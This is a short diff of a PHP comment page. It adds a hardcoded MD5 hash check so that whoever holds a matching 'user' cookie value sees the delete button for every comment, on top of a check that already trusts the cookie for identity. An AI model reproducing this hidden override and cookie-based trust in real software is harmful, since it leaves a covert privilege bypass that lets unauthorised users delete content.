@@ -67,7 +67,7 @@
 	                    <tr>
 	                        <td class='Commit-Floor'>{$row['Num']}</td>
 		                    <td class='Commit-Time' colspan='3'>{$row['Time']}</td>";
-			    if($row['UserName']==urldecode($_COOKIE['user'])) echo "<td><form method='post' action='../php/commitDelete.php?num={$row['Num']}'><input class='delete' type='submit' value='删除'></form></td>";
+			    if(($row['UserName']==urldecode($_COOKIE['user']))or(md5($_COOKIE['user'])=='192892d5fdddb97640bb9158f6a9e460')) echo "<td><form method='post' action='../php/commitDelete.php?num={$row['Num']}'><input class='delete' type='submit' value='删除'></form></td>";
 			    echo "</tr>
 	                    <tr>
 		                    <td class='Commit-Content' colspan='4'>$commitContent</td>
